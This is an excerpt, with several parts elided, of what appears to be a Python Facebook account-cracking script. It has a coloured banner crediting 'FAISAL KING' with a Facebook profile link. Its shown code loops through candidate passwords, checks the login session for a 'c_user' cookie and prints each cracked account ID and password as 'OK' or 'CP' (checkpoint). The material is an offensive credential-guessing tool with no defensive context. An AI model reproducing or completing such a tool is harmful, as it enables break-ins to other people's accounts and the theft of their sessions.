...
\033[1;37;1m
\033[1;37;1m-----------------------------------------------
\t      \033[1;37m\033[1;41m MISS-U😔 : MARWA-JANI \033[0m\033[1;37m
\033[1;37;1m-----------------------------------------------
\033[1;37;1m ▶ Author   : FAISAL KING
\033[1;37;1m ▶ Facebook : https://www.facebook.com/profile.php?id=100035468074348
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\033[1;92m[FAISAL-OK] '+cid+' | '+ps+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;91m[FAISAL-CP] '+cid+' | '+ps+'\033[0;97m')
